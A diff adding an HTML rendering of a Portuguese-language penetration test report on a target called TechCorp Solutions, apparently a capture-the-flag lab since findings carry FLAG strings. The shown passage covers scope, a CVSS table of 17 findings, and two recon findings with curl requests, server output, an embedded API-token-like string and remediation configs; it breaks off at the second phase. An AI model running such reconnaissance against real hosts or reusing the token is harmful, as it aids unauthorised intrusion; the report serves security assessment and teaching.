@@ -1,0 +1,2540 @@
+<!doctype html>
+<html>
+  <head>
+    <title>README.md</title>
+    <meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
+
+    <style>
+      /* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+      /*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+      body {
+        font-family: var(
+          --vscode-markdown-font-family,
+          -apple-system,
+          BlinkMacSystemFont,
+          "Segoe WPC",
+          "Segoe UI",
+          "Ubuntu",
+          "Droid Sans",
+          sans-serif
+        );
+        font-size: var(--vscode-markdown-font-size, 14px);
+        padding: 0 26px;
+        line-height: var(--vscode-markdown-line-height, 22px);
+        word-wrap: break-word;
+      }
+
+      #code-csp-warning {
+        position: fixed;
+        top: 0;
+        right: 0;
+        color: white;
+        margin: 16px;
+        text-align: center;
+        font-size: 12px;
+        font-family: sans-serif;
+        background-color: #444444;
+        cursor: pointer;
+        padding: 6px;
+        box-shadow: 1px 1px 1px rgba(0, 0, 0, 0.25);
+      }
+
+      #code-csp-warning:hover {
+        text-decoration: none;
+        background-color: #007acc;
+        box-shadow: 2px 2px 2px rgba(0, 0, 0, 0.25);
+      }
+
+      body.scrollBeyondLastLine {
+        margin-bottom: calc(100vh - 22px);
+      }
+
+      body.showEditorSelection .code-line {
+        position: relative;
+      }
+
+      body.showEditorSelection .code-active-line:before,
+      body.showEditorSelection .code-line:hover:before {
+        content: "";
+        display: block;
+        position: absolute;
+        top: 0;
+        left: -12px;
+        height: 100%;
+      }
+
+      body.showEditorSelection li.code-active-line:before,
+      body.showEditorSelection li.code-line:hover:before {
+        left: -30px;
+      }
+
+      .vscode-light.showEditorSelection .code-active-line:before {
+        border-left: 3px solid rgba(0, 0, 0, 0.15);
+      }
+
+      .vscode-light.showEditorSelection .code-line:hover:before {
+        border-left: 3px solid rgba(0, 0, 0, 0.4);
+      }
+
+      .vscode-light.showEditorSelection .code-line .code-line:hover:before {
+        border-left: none;
+      }
+
+      .vscode-dark.showEditorSelection .code-active-line:before {
+        border-left: 3px solid rgba(255, 255, 255, 0.4);
+      }
+
+      .vscode-dark.showEditorSelection .code-line:hover:before {
+        border-left: 3px solid rgba(255, 255, 255, 0.6);
+      }
+
+      .vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+        border-left: none;
+      }
+
+      .vscode-high-contrast.showEditorSelection .code-active-line:before {
+        border-left: 3px solid rgba(255, 160, 0, 0.7);
+      }
+
+      .vscode-high-contrast.showEditorSelection .code-line:hover:before {
+        border-left: 3px solid rgba(255, 160, 0, 1);
+      }
+
+      .vscode-high-contrast.showEditorSelection
+        .code-line
+        .code-line:hover:before {
+        border-left: none;
+      }
+
+      img {
+        max-width: 100%;
+        max-height: 100%;
+      }
+
+      a {
+        text-decoration: none;
+      }
+
+      a:hover {
+        text-decoration: underline;
+      }
+
+      a:focus,
+      input:focus,
+      select:focus,
+      textarea:focus {
+        outline: 1px solid -webkit-focus-ring-color;
+        outline-offset: -1px;
+      }
+
+      hr {
+        border: 0;
+        height: 2px;
+        border-bottom: 2px solid;
+      }
+
+      h1 {
+        padding-bottom: 0.3em;
+        line-height: 1.2;
+        border-bottom-width: 1px;
+        border-bottom-style: solid;
+      }
+
+      h1,
+      h2,
+      h3 {
+        font-weight: normal;
+      }
+
+      table {
+        border-collapse: collapse;
+      }
+
+      table > thead > tr > th {
+        text-align: left;
+        border-bottom: 1px solid;
+      }
+
+      table > thead > tr > th,
+      table > thead > tr > td,
+      table > tbody > tr > th,
+      table > tbody > tr > td {
+        padding: 5px 10px;
+      }
+
+      table > tbody > tr + tr > td {
+        border-top: 1px solid;
+      }
+
+      blockquote {
+        margin: 0 7px 0 5px;
+        padding: 0 16px 0 10px;
+        border-left-width: 5px;
+        border-left-style: solid;
+      }
+
+      code {
+        font-family:
+          Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace,
+          "Droid Sans Fallback";
+        font-size: 1em;
+        line-height: 1.357em;
+      }
+
+      body.wordWrap pre {
+        white-space: pre-wrap;
+      }
+
+      pre:not(.hljs),
+      pre.hljs code > div {
+        padding: 16px;
+        border-radius: 3px;
+        overflow: auto;
+      }
+
+      pre code {
+        color: var(--vscode-editor-foreground);
+        tab-size: 4;
+      }
+
+      /** Theming */
+
+      .vscode-light pre {
+        background-color: rgba(220, 220, 220, 0.4);
+      }
+
+      .vscode-dark pre {
+        background-color: rgba(10, 10, 10, 0.4);
+      }
+
+      .vscode-high-contrast pre {
+        background-color: rgb(0, 0, 0);
+      }
+
+      .vscode-high-contrast h1 {
+        border-color: rgb(0, 0, 0);
+      }
+
+      .vscode-light table > thead > tr > th {
+        border-color: rgba(0, 0, 0, 0.69);
+      }
+
+      .vscode-dark table > thead > tr > th {
+        border-color: rgba(255, 255, 255, 0.69);
+      }
+
+      .vscode-light h1,
+      .vscode-light hr,
+      .vscode-light table > tbody > tr + tr > td {
+        border-color: rgba(0, 0, 0, 0.18);
+      }
+
+      .vscode-dark h1,
+      .vscode-dark hr,
+      .vscode-dark table > tbody > tr + tr > td {
+        border-color: rgba(255, 255, 255, 0.18);
+      }
+    </style>
+
+    <style>
+      /* Tomorrow Theme */
+      /* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+      /* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+      /* Tomorrow Comment */
+      .hljs-comment,
+      .hljs-quote {
+        color: #8e908c;
+      }
+
+      /* Tomorrow Red */
+      .hljs-variable,
+      .hljs-template-variable,
+      .hljs-tag,
+      .hljs-name,
+      .hljs-selector-id,
+      .hljs-selector-class,
+      .hljs-regexp,
+      .hljs-deletion {
+        color: #c82829;
+      }
+
+      /* Tomorrow Orange */
+      .hljs-number,
+      .hljs-built_in,
+      .hljs-builtin-name,
+      .hljs-literal,
+      .hljs-type,
+      .hljs-params,
+      .hljs-meta,
+      .hljs-link {
+        color: #f5871f;
+      }
+
+      /* Tomorrow Yellow */
+      .hljs-attribute {
+        color: #eab700;
+      }
+
+      /* Tomorrow Green */
+      .hljs-string,
+      .hljs-symbol,
+      .hljs-bullet,
+      .hljs-addition {
+        color: #718c00;
+      }
+
+      /* Tomorrow Blue */
+      .hljs-title,
+      .hljs-section {
+        color: #4271ae;
+      }
+
+      /* Tomorrow Purple */
+      .hljs-keyword,
+      .hljs-selector-tag {
+        color: #8959a8;
+      }
+
+      .hljs {
+        display: block;
+        overflow-x: auto;
+        color: #4d4d4c;
+        padding: 0.5em;
+      }
+
+      .hljs-emphasis {
+        font-style: italic;
+      }
+
+      .hljs-strong {
+        font-weight: bold;
+      }
+    </style>
+
+    <style>
+      /*
+ * Markdown PDF CSS
+ */
+
+      body {
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu",
+          "Droid Sans", sans-serif, "Meiryo";
+        padding: 0 12px;
+      }
+
+      pre {
+        background-color: #f8f8f8;
+        border: 1px solid #cccccc;
+        border-radius: 3px;
+        overflow-x: auto;
+        white-space: pre-wrap;
+        overflow-wrap: break-word;
+      }
+
+      pre:not(.hljs) {
+        padding: 23px;
+        line-height: 19px;
+      }
+
+      blockquote {
+        background: rgba(127, 127, 127, 0.1);
+        border-color: rgba(0, 122, 204, 0.5);
+      }
+
+      .emoji {
+        height: 1.4em;
+      }
+
+      code {
+        font-size: 14px;
+        line-height: 19px;
+      }
+
+      /* for inline code */
+      :not(pre):not(.hljs) > code {
+        color: #c9ae75; /* Change the old color so it seems less like an error */
+        font-size: inherit;
+      }
+
+      /* Page Break : use <div class="page"/> or <div class="page"></div> to insert page break
+-------------------------------------------------------- */
+      .page {
+        page-break-after: always;
+      }
+    </style>
+
+    <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+  </head>
+  <body>
+    <script>
+      mermaid.initialize({
+        startOnLoad: true,
+        theme:
+          document.body.classList.contains("vscode-dark") ||
+          document.body.classList.contains("vscode-high-contrast")
+            ? "dark"
+            : "default",
+      });
+    </script>
+    <h1 id="relatório-técnico-de-teste-de-intrusão-pentest">
+      RELATÓRIO TÉCNICO DE TESTE DE INTRUSÃO (PENTEST)
+    </h1>
+    <p>
+      <strong>Projeto:</strong> Avaliação de Segurança Ofensiva e Análise de
+      Postura de Risco <strong>Alvo:</strong> TechCorp Solutions (<code
+        >98.95.207.28</code
+      >
+      / Infraestrutura Interna <code>172.20.0.0/24</code>)
+      <strong>Metodologias de Referência:</strong> OWASP Web Security Testing
+      Guide (WSTG v4.2), PTES (Penetration Testing Execution Standard) e OSSTMM
+      3.0 <strong>Classificação:</strong> Documento Estritamente Confidencial —
+      Nível Corporativo TLP:RED
+    </p>
+    <hr />
+    <h2 id="1-sumário-executivo">1. SUMÁRIO EXECUTIVO</h2>
+    <p>
+      Durante a auditoria de segurança ofensiva conduzida no ambiente da
+      <strong>TechCorp Solutions</strong>, avaliou-se a superfície de ataque
+      externa e os limites de segurança da infraestrutura de hospedagem e
+      aplicações web. O engajamento revelou um cenário de
+      <strong>Risco Crítico Imediato</strong>, caracterizado pelo encadeamento
+      de 17 vulnerabilidades interconectadas que permitiram o comprometimento
+      total da confidencialidade, integridade e disponibilidade da plataforma.
+    </p>
+    <pre
+      class="hljs"
+    ><code><div>       [ RECONHECIMENTO ]               [ ACESSO INICIAL ]            [ CONTROLE TOTAL ]
+  Código-fonte &amp; robots.txt  ---&gt;  FTP Anônimo &amp; Credenciais  ---&gt;  LFI, SSH &amp; Git Token
+  (Vazamento de Pistas)             (Exposição de Arquivos)          (Comprometimento RCE)
+</div></code></pre>
+    <h3 id="11-resumo-do-impacto-de-negócio-e-financeiro">
+      1.1. Resumo do Impacto de Negócio e Financeiro
+    </h3>
+    <ol>
+      <li>
+        <strong
+          >Comprometimento da Confidencialidade e Exfiltração de Dados:</strong
+        >
+        A exploração de vulnerabilidades de Injeção de SQL (SQLi) e Inclusão
+        Local de Arquivos (LFI) viabilizou o despejo irrestrito de bases
+        cadastrais contendo dados pessoais de clientes, registros de mensagens
+        comerciais e tokens de API
+        (<code>sk_prod_A7x9mP2qR5tY8wZ3vC6nB4jK1lM0hG</code>).
+      </li>
+      <li>
+        <strong
+          >Impacto Regulatório e Conformidade (LGPD - Lei nº
+          13.709/2018):</strong
+        >
+        A exposição de dados estruturados e registros de usuários caracteriza
+        incidente de segurança grave sujeito a sanções administrativas previstas
+        no Art. 52 da LGPD, incluindo multas de até 2% do faturamento da
+        organização (limitadas a R$ 50 milhões por infração), além de
+        publicização compulsória da infração e danos reputacionais severos.
+      </li>
+      <li>
+        <strong>Sequestro de Ativos e Acesso à Nuvem:</strong> A extração de
+        credenciais de infraestrutura em texto claro e Tokens de Acesso Pessoal
+        (PAT) do GitHub permitiu acesso de nível administrativo ao código-fonte
+        proprietário da empresa, possibilitando movimentação lateral direta para
+        outros repositórios e serviços de nuvem AWS.
+      </li>
+    </ol>
+    <hr />
+    <h2 id="2-escopo-e-regras-de-engajamento-roe">
+      2. ESCOPO E REGRAS DE ENGAJAMENTO (ROE)
+    </h2>
+    <h3 id="21-ativos-no-escopo">2.1. Ativos no Escopo</h3>
+    <ul>
+      <li>
+        <strong>Endereço IPv4 Primário:</strong> <code>98.95.207.28</code>
+      </li>
+      <li>
+        <strong>Rede Interna Mapeada:</strong>
+        <code>172.20.0.0/24</code> (Segmento Docker/VPC)
+      </li>
+      <li>
+        <strong>Aplicações Web:</strong>
+        <code>http://98.95.207.28/</code> (Portas 80/TCP e 8080/TCP)
+      </li>
+      <li>
+        <strong>Serviços de Infraestrutura:</strong> SSH (2222/TCP), FTP
+        (21/TCP), MySQL (3306/TCP)
+      </li>
+    </ul>
+    <h3 id="22-parâmetros-éticos-e-restrições-operacionais">
+      2.2. Parâmetros Éticos e Restrições Operacionais
+    </h3>
+    <ul>
+      <li>
+        <strong>Negação de Serviço (DoS/DDoS):</strong> Testes volumétricos que
+        pudessem comprometer a estabilidade do hardware ou link foram
+        estritamente proibidos.
+      </li>
+      <li>
+        <strong>Integridade dos Dados:</strong> Foi vedada a destruição,
+        alteração maliciosa permanente ou deleção de registros reais nas tabelas
+        do banco de dados <code>techcorp_db</code>.
+      </li>
+      <li>
+        <strong>Tratamento de Evidências:</strong> Todas as provas de conceito
+        (PoCs), credenciais extraídas e artefatos de teste foram armazenados com
+        criptografia simétrica AES-256 e mantidos em custódia restrita.
+      </li>
+    </ul>
+    <hr />
+    <h2 id="3-matriz-de-criticidade-de-riscos">
+      3. MATRIZ DE CRITICIDADE DE RISCOS
+    </h2>
+    <table>
+      <thead>
+        <tr>
+          <th style="text-align: left">ID</th>
+          <th style="text-align: left">Vulnerabilidade Identificada</th>
+          <th style="text-align: left">Vetor / Protocolo</th>
+          <th style="text-align: left">CVSS v3.1</th>
+          <th style="text-align: left">Score</th>
+          <th style="text-align: left">Severidade</th>
+          <th style="text-align: left">Status</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td style="text-align: left"><strong>F01</strong></td>
+          <td style="text-align: left">
+            Vazamento de Informações Sensíveis em Comentários HTML
+          </td>
+          <td style="text-align: left">HTTP (80/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>5.3</strong></td>
+          <td style="text-align: left">Médio</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F02</strong></td>
+          <td style="text-align: left">
+            Exposição de Diretórios Críticos e Backups no
+            <code>robots.txt</code>
+          </td>
+          <td style="text-align: left">HTTP (80/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>5.3</strong></td>
+          <td style="text-align: left">Médio</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F03</strong></td>
+          <td style="text-align: left">
+            Autenticação Anônima Habilitada no Servidor FTP
+          </td>
+          <td style="text-align: left">FTP (21/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>7.5</strong></td>
+          <td style="text-align: left">Alto</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F04</strong></td>
+          <td style="text-align: left">
+            Exposição de Arquivo de Configuração (<code>user.conf</code>) no FTP
+          </td>
+          <td style="text-align: left">FTP (21/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>7.5</strong></td>
+          <td style="text-align: left">Alto</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F05</strong></td>
+          <td style="text-align: left">
+            Armazenamento de Senhas em Texto Claro (<code>passwords.txt</code>)
+          </td>
+          <td style="text-align: left">FTP (21/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>7.5</strong></td>
+          <td style="text-align: left">Alto</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F06</strong></td>
+          <td style="text-align: left">
+            Exposição Pública de Arquivo de Conexão com o Banco
+          </td>
+          <td style="text-align: left">HTTP (80/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>8.6</strong></td>
+          <td style="text-align: left">Alto</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F07</strong></td>
+          <td style="text-align: left">
+            Descoberta de Views Ocultas via SQL Injection
+          </td>
+          <td style="text-align: left">HTTP (80/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>7.5</strong></td>
+          <td style="text-align: left">Alto</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F08</strong></td>
+          <td style="text-align: left">
+            Extração Completa de Registros Sigilosos (Data Dump)
+          </td>
+          <td style="text-align: left">HTTP (80/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>8.2</strong></td>
+          <td style="text-align: left">Alto</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F09</strong></td>
+          <td style="text-align: left">
+            Quebra de Autenticação Administrativa (SQLi Bypass)
+          </td>
+          <td style="text-align: left">HTTP (80/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>
+          </td>
+          <td style="text-align: left"><strong>9.8</strong></td>
+          <td style="text-align: left">Crítico</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F10</strong></td>
+          <td style="text-align: left">
+            Sequestro de Sessão Administrativa via XSS Refletido
+          </td>
+          <td style="text-align: left">HTTP (80/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>8.2</strong></td>
+          <td style="text-align: left">Alto</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F11</strong></td>
+          <td style="text-align: left">
+            Quebra de Controle de Acesso e Escalação Horizontal/Vertical
+          </td>
+          <td style="text-align: left">HTTP (80/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>8.1</strong></td>
+          <td style="text-align: left">Alto</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F12</strong></td>
+          <td style="text-align: left">
+            Inclusão Local de Arquivos (LFI) via Wrappers PHP
+          </td>
+          <td style="text-align: left">HTTP (80/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>6.5</strong></td>
+          <td style="text-align: left">Médio</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F13</strong></td>
+          <td style="text-align: left">
+            Acesso Remoto SSH Não Autorizado e Vazamento de Segredos
+          </td>
+          <td style="text-align: left">SSH (2222/TCP)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code>
+          </td>
+          <td style="text-align: left"><strong>9.8</strong></td>
+          <td style="text-align: left">Crítico</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F14</strong></td>
+          <td style="text-align: left">
+            Exposição de Comandos e Segredos no <code>.bash_history</code>
+          </td>
+          <td style="text-align: left">Local (Terminal)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>5.5</strong></td>
+          <td style="text-align: left">Médio</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F15</strong></td>
+          <td style="text-align: left">
+            Credenciais Hardcoded em Scripts Administrativos
+          </td>
+          <td style="text-align: left">Local (SO)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>7.1</strong></td>
+          <td style="text-align: left">Alto</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F16</strong></td>
+          <td style="text-align: left">
+            Armazenamento Inseguro de Flags e Segredos de Backup
+          </td>
+          <td style="text-align: left">Local (SO)</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code>
+          </td>
+          <td style="text-align: left"><strong>5.5</strong></td>
+          <td style="text-align: left">Médio</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+        <tr>
+          <td style="text-align: left"><strong>F17</strong></td>
+          <td style="text-align: left">
+            Vazamento de Token GitHub PAT em <code>.git-credentials</code>
+          </td>
+          <td style="text-align: left">Local / Git</td>
+          <td style="text-align: left">
+            <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code>
+          </td>
+          <td style="text-align: left"><strong>9.9</strong></td>
+          <td style="text-align: left">Crítico</td>
+          <td style="text-align: left">Aberto</td>
+        </tr>
+      </tbody>
+    </table>
+    <hr />
+    <h2 id="4-detalhamento-técnico-das-17-explorações">
+      4. DETALHAMENTO TÉCNICO DAS 17 EXPLORAÇÕES
+    </h2>
+    <pre
+      class="hljs"
+    ><code><div>   +-------------------------------------------------------------------------+
+   |                        FASE 1: RECONHECIMENTO                           |
+   +-------------------------------------------------------------------------+
+</div></code></pre>
+    <h3 id="falha-01-vazamento-de-informações-sensíveis-no-código-fonte-html">
+      FALHA 01: Vazamento de Informações Sensíveis no Código-Fonte HTML
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F01</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>MÉDIO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N —
+        Score: <strong>5.3</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> Camada de Apresentação HTTP /
+        Comentários no DOM
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-200 (Exposure of Sensitive
+        Information), OWASP WSTG-INFO-05
+      </li>
+    </ul>
+    <h4 id="descrição-técnica">Descrição Técnica</h4>
+    <p>
+      Durante a análise estática das respostas HTTP fornecidas pelo servidor web
+      na porta 80, identificou-se que comentários de depuração e flags de
+      desenvolvimento foram mantidos no código HTML entregue aos clientes. Essa
+      prática expõe a arquitetura interna e artefatos de validação do sistema a
+      usuários não autenticados.
+    </p>
+    <h4 id="prova-de-conceito-poc">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Requisição HTTP automatizada para o endpoint raiz:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>curl -s http://98.95.207.28/ | grep -i <span class="hljs-string">&quot;FLAG&quot;</span> -B 2 -A 2
+</div></code></pre>
+    <ol start="2">
+      <li>
+        Resposta obtida contendo a flag comentada na estrutura do rodapé
+        (<code>&lt;footer&gt;</code>):
+      </li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>        <span class="hljs-comment">&lt;!-- &lt;p&gt;Desenvolvido por nossa equipe interna&lt;/p&gt; --&gt;</span>
+        <span class="hljs-comment">&lt;!--FLAG{b4s1c_s0urc3_c0d3_1nsp3ct10n}--&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
+</div></code></pre>
+    <h4 id="impactos">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Divulgação de dados de desenvolvimento
+        e perda de controle sobre artefatos de integridade do código.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Quebra da postura de segurança por
+        obscuridade, fornecendo vetores contextuais diretos a atacantes.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica">Remediação Técnica</h4>
+    <p>
+      Configurar o pipeline de CI/CD para implementar etapas automáticas de
+      minificação e remoção de comentários HTML antes do deploy em produção.
+    </p>
+    <p>
+      <em>Exemplo de configuração de build com <code>html-minifier</code>:</em>
+    </p>
+    <pre class="hljs"><code><div><span class="hljs-punctuation">{</span>
+  <span class="hljs-attr">&quot;removeComments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;collapseWhitespace&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
+  <span class="hljs-attr">&quot;minifyJS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
+<span class="hljs-punctuation">}</span>
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f01_html_leak_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f01_source_inspection.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_recon_f01.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3
+      id="falha-02-comentários-confidenciais-e-diretórios-expostos-no-robotstxt"
+    >
+      FALHA 02: Comentários Confidenciais e Diretórios Expostos no
+      <code>robots.txt</code>
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F02</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>MÉDIO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N —
+        Score: <strong>5.3</strong>)
+      </li>
+      <li><strong>Vetor de Ataque:</strong> HTTP / Mapeamento de Metadados</li>
+      <li>
+        <strong>Referências:</strong> CWE-548 (Exposure of Information Through
+        Directory Listing), OWASP WSTG-INFO-03
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-1">Descrição Técnica</h4>
+    <p>
+      O arquivo <code>/robots.txt</code>, cujo propósito estrito é orientar
+      rastreadores web, continha diretivas de desautorização
+      (<code>Disallow</code>) que revelavam caminhos administrativos e
+      diretórios restritos do sistema, além de comentários em texto claro
+      indicando a localização exata de um arquivo de despejo do banco de dados
+      (<code>.sql</code>).
+    </p>
+    <h4 id="prova-de-conceito-poc-1">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Leitura direta do arquivo via utilitário de linha de comando:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>curl -s <span class="hljs-string">&quot;http://98.95.207.28/robots.txt&quot;</span>
+</div></code></pre>
+    <ol start="2">
+      <li>Saída retornada pelo servidor Apache:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*
+<span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/admin/
+<span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/backup/
+<span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/.git/
+<span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/config/
+
+# FLAG{r0b0ts_txt_l34k4g3}
+# Arquivo de backup: /backup/database_backup_2024.sql
+</div></code></pre>
+    <h4 id="impactos-1">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Enumeração passiva imediata da
+        topologia de diretórios sensíveis (<code>/backup</code>,
+        <code>/.git</code>, <code>/config</code>).
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Facilitação do reconhecimento
+        direcionado sem disparar alertas em sistemas WAF tradicionais.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-1">Remediação Técnica</h4>
+    <p>
+      Remover qualquer comentário ou referência a arquivos confidenciais do
+      <code>/robots.txt</code>. O controle de acesso a recursos restritos deve
+      ser garantido por mecanismos de autenticação robustos no servidor web e na
+      aplicação, e não pela ocultação em arquivos públicos.
+    </p>
+    <p>
+      <em
+        >Configuração de bloqueio no Apache
+        (<code>/etc/apache2/sites-available/techcorp.conf</code>):</em
+      >
+    </p>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-section">&lt;Directory <span class="hljs-string">&quot;/var/www/html/backup&quot;</span>&gt;</span>
+    <span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> denied
+<span class="hljs-section">&lt;/Directory&gt;</span>
+<span class="hljs-section">&lt;Directory <span class="hljs-string">&quot;/var/www/html/.git&quot;</span>&gt;</span>
+    <span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> denied
+<span class="hljs-section">&lt;/Directory&gt;</span>
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f02_robots_leak_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f02_robots_recon.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_recon_f02.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <pre
+      class="hljs"
+    ><code><div>   +-------------------------------------------------------------------------+
+   |                 FASE 2: EXPLORAÇÃO DE SERVIÇOS DE REDE                  |
